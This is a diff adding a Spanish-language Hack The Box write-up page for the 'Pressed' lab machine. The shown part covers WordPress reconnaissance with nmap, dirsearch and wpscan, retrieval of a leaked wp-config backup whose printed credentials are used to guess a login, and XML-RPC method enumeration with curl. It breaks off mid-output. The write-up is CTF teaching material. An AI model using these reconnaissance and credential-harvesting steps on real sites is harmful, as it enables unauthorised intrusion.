@@ -1,0 +1,1095 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HackTheBox - Pressed (hard) · MiguelRega7</title>
+<meta name="description" content="PortScan Enumeración - El escaneo de Nmap solo nos reporta 1 puerto abierto que esta corriendo un servicio http y esta usando un gestor de contenido que es Wordpress . - Si investi"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Hack The Box</span><h1>HackTheBox - Pressed (hard)</h1><div class="meta"><span>◷</span><time>2024-06-24</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">PortScan Enumeración - El escaneo de Nmap solo nos reporta 1 puerto abierto que esta corriendo un servicio http y esta usando un gestor de contenido que es Wordpress . - Si investi.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#portscan">PortScan</a><a href="#enumeraci-n">Enumeración</a><a href="#user-flag">User flag</a><a href="#shell-as-www-data">Shell as www-data</a><a href="#privilege-escalation">Privilege Escalation</a></aside><article class="article-content" id="top"><p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/933a05448c07bbdc08c3dcc1fe75aea6.png">
+</p>
+
+<h2 id="portscan">PortScan</h2>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap sudo nmap -sCV -p80 10.10.11.142 -oN targeted
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 11:42 CST
+Nmap scan report for 10.10.11.142
+Host is up (0.11s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: UHC Jan Finals &amp;#8211; New Month, New Boxes
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-generator: WordPress 5.9
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap sudo nmap --script http-enum -p80 10.10.11.142
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 11:46 CST
+Nmap scan report for 10.10.11.142
+Host is up (0.11s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum:
+|   /wp-login.php: Possible admin folder
+|   /readme.html: Wordpress version: 2
+|   /: WordPress version: 5.9
+|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
+|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
+|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
+|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
+|   /wp-login.php: Wordpress login page.
+|   /wp-admin/upgrade.php: Wordpress login page.
+|_  /readme.html: Interesting, a readme.
+</code></pre></div></div>
+<h2 id="enumeraci-n">Enumeración</h2>
+<ul>
+<li><p>El escaneo de <strong>Nmap</strong> solo nos reporta 1 puerto abierto que esta corriendo un servicio <code>http</code> y esta usando un gestor de contenido que es <code>Wordpress</code>.</p>
+</li>
+<li><p>Si investigamos la versión actual de <code>Wordpress</code> es la 6.5 <a href="https://www.nexcess.net/blog/wordpress-version/#:~:text=What%20is%20the%20WordPress%20current,site%20editor%20changes%2C%20and%20more.">https://www.nexcess.net/blog/wordpress-version/#:~:text=What%20is%20the%20WordPress%20current,site%20editor%20changes%2C%20and%20more.</a>.</p>
+</li>
+<li><p>Esta es la pagina web.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/1.png">
+</p>
+
+<ul>
+<li>Si damos click en el texto subrayado <code>UHC January Finals Under Way</code> se nos muestra lo siguiente.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/2.png">
+</p>
+
+<ul>
+<li>Vamos agregar el subdominio al <code>/etc/hosts</code> para ver si cambia algo en la web.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap sudo echo &quot;10.10.11.142 pressed.htb&quot; | sudo tee -a /etc/hosts
+10.10.11.142 pressed.htb
+</code></pre></div></div>
+<ul>
+<li>Pero vemos lo mismo.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/3.png">
+</p>
+
+<ul>
+<li>Vamos a llenar esa información para ver que es lo que pasa.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/4.png">
+</p>
+
+<ul>
+<li>Bueno al principio no paso nada pero cuando volví a hacerlo me salió este mensaje.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/5.png">
+</p>
+
+<ul>
+<li>Sabemos que existen las ruta típicas de <code>WordPress</code> pero vamos a hacer <code>Fuzzing</code> para ver si encontramos otra ruta interesante.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap dirsearch -u http://10.10.11.142
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/miguel/Hackthebox/Pressed/nmap/reports/http_10.10.11.142/_24-06-24_12-01-54.txt
+
+Target: http://10.10.11.142/
+
+[12:01:54] Starting:
+[12:02:04] 403 -  277B  - /.ht_wsr.txt
+[12:02:05] 403 -  277B  - /.htaccess.sample
+[12:02:05] 403 -  277B  - /.htaccess_extra
+[12:02:05] 403 -  277B  - /.htaccess.orig
+[12:02:05] 403 -  277B  - /.htaccess_orig
+[12:02:05] 403 -  277B  - /.htaccess.save
+[12:02:05] 403 -  277B  - /.htaccessBAK
+[12:02:05] 403 -  277B  - /.htaccess.bak1
+[12:02:05] 403 -  277B  - /.htaccessOLD
+[12:02:05] 403 -  277B  - /.htaccessOLD2
+[12:02:05] 403 -  277B  - /.htaccess_sc
+[12:02:05] 403 -  277B  - /.httr-oauth
+[12:02:05] 403 -  277B  - /.html
+[12:02:05] 403 -  277B  - /.htm
+[12:02:05] 403 -  277B  - /.htpasswd_test
+[12:02:05] 403 -  277B  - /.htpasswds
+[12:02:11] 403 -  277B  - /.php
+[12:02:18] 200 -    4KB - /.wp-config.php.swp
+[12:04:18] 301 -    0B  - /index.php  -&gt;  http://10.10.11.142/
+[12:04:19] 404 -   21KB - /index.php/login/
+[12:04:29] 200 -    7KB - /license.txt
+[12:05:19] 200 -    3KB - /readme.html
+[12:05:26] 403 -  277B  - /server-status
+</code></pre></div></div>
+<ul>
+<li><p>Vemos que en una ruta hay un archivo <code>.swp</code> <a href="https://filext.com/es/extension-de-archivo/SWP">https://filext.com/es/extension-de-archivo/SWP</a>.</p>
+</li>
+<li><p>Si enumeramos con <code>wpscan</code> vemos que ya nos dice que el <code>XML-RPC</code> esta activado.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap wpscan --url http://10.10.11.142
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.25
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.11.142/ [10.10.11.142]
+[+] Started: Mon Jun 24 12:40:59 2024
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.11.142/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.10.11.142/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.10.11.142/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.11.142/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.9 identified (Insecure, released on 2022-01-25).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.10.11.142/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.9&lt;/generator&gt;
+ |  - http://10.10.11.142/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.9&lt;/generator&gt;
+
+[+] WordPress theme in use: retrogeek
+ | Location: http://10.10.11.142/wp-content/themes/retrogeek/
+ | Last Updated: 2024-04-26T00:00:00.000Z
+ | Readme: http://10.10.11.142/wp-content/themes/retrogeek/README.txt
+ | [!] The version is out of date, the latest version is 0.7
+ | Style URL: http://10.10.11.142/wp-content/themes/retrogeek/style.css?ver=42
+ | Style Name: RetroGeek
+ | Style URI: https://tuxlog.de/retrogeek/
+ | Description: A lightweight, minimal, fast and geeky retro theme remembering the good old terminal times...
+ | Author: tuxlog
+ | Author URI: https://tuxlog.de/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 0.5 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.11.142/wp-content/themes/retrogeek/style.css?ver=42, Match: 'Version: 0.5'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:04 &lt;=====================================================&gt; (137 / 137) 100.00% Time: 00:00:04
+
+[i] Config Backup(s) Identified:
+
+[!] http://10.10.11.142/wp-config.php.bak
+ | Found By: Direct Access (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Mon Jun 24 12:41:23 2024
+[+] Requests Done: 173
+[+] Cached Requests: 5
+[+] Data Sent: 44.019 KB
+[+] Data Received: 126.531 KB
+[+] Memory used: 253.621 MB
+[+] Elapsed time: 00:00:23
+</code></pre></div></div>
+<ul>
+<li>Vemos un <code>wp-config.php.bak</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap wget http://10.10.11.142/wp-config.php.bak
+--2024-06-24 12:42:38--  http://10.10.11.142/wp-config.php.bak
+Connecting to 10.10.11.142:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3194 (3.1K) [application/x-trash]
+Saving to: ‘wp-config.php.bak’
+
+wp-config.php.bak                100%[==========================================================&gt;]   3.12K  --.-KB/s    in 0.005s
+
+2024-06-24 12:42:38 (638 KB/s) - ‘wp-config.php.bak’ saved [3194/3194]
+</code></pre></div></div>
+<ul>
+<li>Vemos credenciales.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap cat wp-config.php.bak
+&lt;?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the web site, you can copy this file to &quot;wp-config.php&quot;
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * Database settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** Database username */
+define( 'DB_USER', 'admin' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'uhc-jan-finals-2021' );
+
+/** Database hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+/**#@+
+ * Authentication unique keys and salts.
+ *
+ * Change these to different unique phrases! You can generate these using
+ * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
+ *
+ * You can change these at any point in time to invalidate all existing cookies.
+ * This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         '3MYXll40,8gfj_jX4!3J(278f1(SGEZ+v]#w]Bu&lt;PrstLLHEZig,MJB#t E2pU2t' );
+define( 'SECURE_AUTH_KEY',  'QPkQ%%h&amp;5$3$C;Z}2N!LKz.O 57i2U.582Gy{C=$XV_(jJz~3gC=*nKP//{v{?n&lt;' );
+define( 'LOGGED_IN_KEY',    'rp}RE/3-_3OF%./6PH` 1zbCy#H22NRH,ETR(c2*Qlu&amp;W&gt;lW|::4T[iFx%W|%[hA' );
+define( 'NONCE_KEY',        '#%s&amp;zIE/mSuvN{+2]^n;21]|u;gmP6!-ihyCn91j{/.KRGbg8}{3C%kZ#$(i&amp;bc-' );
+define( 'AUTH_SALT',        ',7BVMi:h`][Q/3j8tHN*EjKk,jY|+hm.3OnjYS A$ArIx7B z]WzLJ$Tc7&lt;/s`td' );
+define( 'SECURE_AUTH_SALT', ']s_RJ,%OLa.}_8wP Qeu9WJUhJ2Zd2I%&gt;T5R#f{8op9:Hn??}7{ZJ*.K.t/{lVl0' );
+define( 'LOGGED_IN_SALT',   'wwQj(p&amp;1I8zAK!2lhR[xg.Vt`qeh|2R}HMz?~TuQ9QE*@iy?@*?pDV;[4BL9*n#W' );
+define( 'NONCE_SALT',       '[Wv%%EDN&lt;b/a_&lt;/u|snqMQ q)xPW8GyB4WAw f+1k2|IFbu*7#U(g-# l{Kw n6Z' );
+
+/**#@-*/
+
+/**
+ * WordPress database table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/* Add any custom values between this line and the &quot;stop editing&quot; line. */
+
+
+
+/* That's all, stop editing! Happy publishing. */
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+	define( 'ABSPATH', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+</code></pre></div></div>
+<ul>
+<li><p><code>admin:uhc-jan-finals-2021</code></p>
+</li>
+<li><p>Si probamos las credenciales vemos que son incorrectas.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/xd.png">
+</p>
+
+<ul>
+<li>Si cambiamos de 2021 a 2022 nos muestra esto.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/zi.png">
+</p>
+
+<ul>
+<li><p>Con esto sabemos que la credencial es valida.</p>
+</li>
+<li><p>Podemos enumerar mediante este script <code>php</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#xml-rpc">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#xml-rpc</a>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap curl -s -X POST http://10.10.11.142/xmlrpc.php
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;methodResponse&gt;
+  &lt;fault&gt;
+    &lt;value&gt;
+      &lt;struct&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultCode&lt;/name&gt;
+          &lt;value&gt;&lt;int&gt;-32700&lt;/int&gt;&lt;/value&gt;
+        &lt;/member&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultString&lt;/name&gt;
+          &lt;value&gt;&lt;string&gt;parse error. not well formed&lt;/string&gt;&lt;/value&gt;
+        &lt;/member&gt;
+      &lt;/struct&gt;
+    &lt;/value&gt;
+  &lt;/fault&gt;
+&lt;/methodResponse&gt;
+</code></pre></div></div>
+<ul>
+<li>Hay una ruta llamada <code>/uploads</code> pero no hay nada.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/6.png">
+</p>
+
+<ul>
+<li><p><a href="https://www.hostinger.mx/tutoriales/que-es-xmlrpc-php-wordpress-por-que-desactivarlo/">https://www.hostinger.mx/tutoriales/que-es-xmlrpc-php-wordpress-por-que-desactivarlo/</a>.</p>
+</li>
+<li><p>Vamos a ver si esta activo.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap curl -X POST --data &quot;&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;&quot; http://10.10.11.142/xmlrpc.php
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;methodResponse&gt;
+  &lt;params&gt;
+    &lt;param&gt;
+      &lt;value&gt;
+      &lt;array&gt;&lt;data&gt;
+  &lt;value&gt;&lt;string&gt;system.multicall&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;system.listMethods&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;system.getCapabilities&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;htb.get_flag&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;demo.addTwoNumbers&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;demo.sayHello&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;pingback.extensions.getPingbacks&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;pingback.ping&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.publishPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.getTrackbackPings&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.supportedTextFilters&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.supportedMethods&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.setPostCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.getPostCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.getRecentPostTitles&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.getCategoryList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.deletePost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.newMediaObject&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.getCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.getRecentPosts&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.getPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.editPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.newPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.deletePost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.editPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.newPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.getRecentPosts&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.getPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.getUserInfo&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.restoreRevision&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getRevisions&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPostTypes&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPostType&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPostFormats&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getMediaLibrary&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getMediaItem&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getCommentStatusList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newComment&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editComment&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deleteComment&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getComments&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getComment&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.setOptions&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getOptions&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPageTemplates&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPageStatusList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPostStatusList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getCommentCount&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deleteFile&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.uploadFile&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.suggestCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deleteCategory&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newCategory&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTags&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getAuthors&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPageList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editPage&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deletePage&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newPage&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPages&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPage&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editProfile&lt;/string&gt;&lt;/value&gt;
